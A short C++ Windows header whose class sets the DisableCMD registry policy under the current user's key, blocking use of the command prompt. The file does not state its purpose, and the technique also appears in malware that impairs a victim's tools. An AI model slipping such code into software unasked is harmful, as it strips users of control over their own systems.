#pragma once
#include <iostream>
#include <windows.h>
typedef long _L32;
#define WIN32_LEAN_AND_MEAN
#pragma warning(disable:4129)

class WinRegistry
{
private:

	LPCWSTR DisableCommandPrompt = L"DisableCMD";
	HKEY hKey = HKEY_CURRENT_USER;
	LPCWSTR CMD_PATH = (L"SOFTWARE\\Policies\\Microsoft\\Windows\\");
	DWORD val_disable = 1;
	DWORD val_enable = 0;

public:
	void ProcessValueCMD();
	void _disableCMD();
};

void WinRegistry::ProcessValueCMD()
{
	{
		_L32 cmdResult = RegQueryValueExW(hKey, DisableCommandPrompt, NULL, NULL, NULL, NULL);

		if (cmdResult == ERROR_FILE_NOT_FOUND)
		{
			if (RegSetValueExW(hKey, DisableCommandPrompt, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
			{
				return;
			}
			else
			{
				RegCloseKey(hKey);
			}
		}
		else
		{
			RegSetValueExW(hKey, DisableCommandPrompt, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
			RegCloseKey(hKey);
			return;
		}
		RegCloseKey(hKey);
	}

};

void WinRegistry::_disableCMD()
{
	{
		RegOpenKeyExW(hKey, CMD_PATH, 0, KEY_ALL_ACCESS, &hKey);
		if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		{
			CMD_PATH = (L"SOFTWARE\\Policies\\Microsoft\\Windows\\System\\");
			ProcessValueCMD();
		}
		else
		{
			ProcessValueCMD();
		}
		return;
	}
};